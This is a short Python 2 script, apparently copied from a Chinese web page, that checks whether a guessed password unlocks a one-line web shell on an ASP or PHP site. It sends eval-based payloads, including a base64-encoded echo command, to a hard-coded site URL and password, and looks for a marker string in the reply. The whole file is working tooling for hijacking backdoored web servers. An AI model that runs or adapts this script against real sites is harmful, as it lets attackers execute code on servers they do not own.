#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
#http://www.2cto.com/kf/201304/202422.html
import re,httplib
import gzip,StringIO




def yijuhua_cs(asp_php,url,PASS): #ASP还是PHP  ,URL地址 ，密码
    try:
        #选择扫描方式
        if asp_php == "":
            asp_php = "php"
        if asp_php == "asp":
            params = "=execute(\"response.clear:response.write(\"\"jinlaile\"\"):response.end\")"
        elif asp_php == "php":
            #params = "=@eval($_POST[\"echo(\"jinlaile\");die();\"]);"
            params = "=@eval(base64_decode($_POST[z0]));&z0=ZWNobygiamlubGFpbGUiKTtkaWUoKTs="
        else:
            params = "=Response.Clear();Response.Write(\"jinlaile\");"
            #构造HTTP头
        pattern = re.compile('http:*')
        match = pattern.search(url)
        if(match):
            ztarget = url.replace("http://","").split('/')[0]
            headers={"Host": ztarget,\
                     "User-Agent": "Mozilla/5.0",\
                     "Content-Type": "application/x-www-form-urlencoded",\
                     "Referer": "http://"+ztarget
            }
        else:
            #print "please enter an address....For example: [url]http://www.xxx.com/1.asp[/url]"
            return 0
            #测试  链接
        conn = httplib.HTTPConnection(ztarget)
        params = PASS+params
        try:
            conn.request(method="POST",url=url,body=params,headers=headers)
            response = conn.getresponse()
            if ('content-encoding', 'gzip') in response.getheaders():
                compressedstream = StringIO.StringIO(response.read())
                gzipper = gzip.GzipFile(fileobj=compressedstream)
                data = gzipper.read()
            else:
                data = response.read()
            if(data.find("jinlaile") >= 0):
                #print "!!!!----PASS FIND!!! -------------->"+PASS
                return 1
                #os._exit(1)
        except Exception,e:
            #print e
            return 0

    except Exception,e:
        #print e
        return 0

if __name__ == "__main__":
    url="http://www.97lab.com/plus/90sec.php"
    PASS="guige"
    if yijuhua_cs("php",url,PASS): #ASP还是PHP  ,URL地址 ，密码
        print "%s---pass:%s==OK"%(url,PASS)
    else:
        print "%s---pass:%s==NO"%(url,PASS)




